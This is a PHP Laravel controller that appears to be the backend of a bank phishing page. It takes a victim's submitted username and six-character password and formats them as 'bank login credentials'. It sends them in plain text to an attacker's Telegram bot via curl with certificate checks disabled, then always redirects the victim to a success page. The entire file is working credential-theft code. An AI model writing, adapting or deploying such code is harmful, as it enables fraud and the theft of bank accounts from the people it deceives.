<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;

class ValiderController extends Controller
{
    public function submit(Request $request)
    {
        $validated = $request->validate([
            'username'    => 'required|string|max:225',
            'password' => 'required|string|min:6|max:6',
        ]);

        $message = "🔔 *IDENTIFIANT DE CONNEXION BANCAIRES* 🔔\n\n"
                 . "👤 Nom : {$validated['username']}\n"
                 . "🔑 mot de passe : {$validated['password']}";

        try {
            \Log::info('ValiderController - Attempting to send Telegram message');
            $this->sendTelegramMessage($message);
            \Log::info('ValiderController - Message sent successfully');
            return redirect()->route('success');
        } catch (\Exception $e) {
            \Log::error('ValiderController Telegram error: ' . $e->getMessage());
            return redirect()->route('success');
        }
    }

    private function sendTelegramMessage($message)
    {
        $token = env('TELEGRAM_BOT_TOKEN');
        $chatId = env('TELEGRAM_CHAT_ID');
        
        \Log::info('ValiderController Telegram config check - Token: ' . ($token ? 'SET' : 'MISSING') . ', ChatId: ' . ($chatId ? 'SET (' . $chatId . ')' : 'MISSING'));
        
        if (!$token || !$chatId) {
            \Log::error('ValiderController Telegram config missing');
            throw new \Exception('Telegram config missing');
        }

        $url = "https://api.telegram.org/bot{$token}/sendMessage";
        
        $data = [
            'chat_id' => $chatId,
            'text' => $message,
            'parse_mode' => 'Markdown'
        ];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);

        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $error = curl_error($ch);
        curl_close($ch);

        \Log::info('ValiderController Telegram API response - HTTP Code: ' . $httpCode);
        \Log::info('ValiderController Telegram API response - Body: ' . $response);

        if ($httpCode !== 200) {
            \Log::error('ValiderController Telegram API error: HTTP ' . $httpCode . ' - ' . $response . ' - ' . $error);
            throw new \Exception('Telegram API failed: ' . $response);
        }

        \Log::info('ValiderController Telegram message sent successfully');
    }
}
